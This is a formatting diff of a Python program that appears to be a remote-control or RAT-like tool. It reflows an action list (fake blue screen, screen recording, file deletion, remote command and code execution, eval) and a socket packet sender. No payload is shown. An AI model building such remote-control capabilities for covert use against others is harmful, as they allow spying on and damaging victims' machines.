@@ -73,14 +73,16 @@ class Actions:
     CLOSE_WINDOW = Action("close_window", "关闭窗口")
     EXECUTE_COMMAND = Action("execute_command", "执行命令")
     EXECUTE_CODE = Action("execute_code", "执行代码")
-    action_list = [BLUE_SCREEN,
-                   RECORD_SCREEN,
-                   DELETE_FILE,
-                   POPUP_ERROR_WINDOW,
-                   RETURN_DESKTOP,
-                   CLOSE_WINDOW,
-                   EXECUTE_COMMAND,
-                   EXECUTE_CODE]
+    action_list = [
+        BLUE_SCREEN,
+        RECORD_SCREEN,
+        DELETE_FILE,
+        POPUP_ERROR_WINDOW,
+        RETURN_DESKTOP,
+        CLOSE_WINDOW,
+        EXECUTE_COMMAND,
+        EXECUTE_CODE,
+    ]
     action_map = {action.label: action for action in action_list}
 
 
@@ -122,7 +124,7 @@ class PacketManager:
             timer = perf_counter()
             all_sent = 0
             while True:
-                data = packet[:min(length, 1024 * 1024 * 1024)]
+                data = packet[: min(length, 1024 * 1024 * 1024)]
                 try:
                     send_length = self.sock.send(data)
                 except ConnectionError:
@@ -142,7 +144,9 @@ class PacketManager:
                 if length <= 0:
                     break
 
-    def send_packet(self, packet: Packet, loss_enable: bool = False, priority: int = Priority.HIGHER) -> None:
+    def send_packet(
+        self, packet: Packet, loss_enable: bool = False, priority: int = Priority.HIGHER
+    ) -> None:
         self.packet_stack[priority].append((pack(packet), loss_enable))
         # print("加入数据包队列:", packet["type"])
 
@@ -193,7 +197,6 @@ ACTION_INFO = "action_info"  # Server
 ACTION_ADD = "action_add"  # Server
 ACTION_DEL = "action_del"  # Server
 ACTION_UPDATE = "action_update"  # Server
-ACTION_ENABLE = "action_enable"  # Server
 PING = "ping"  # Server
 EVAL = "eval"  # Server
 
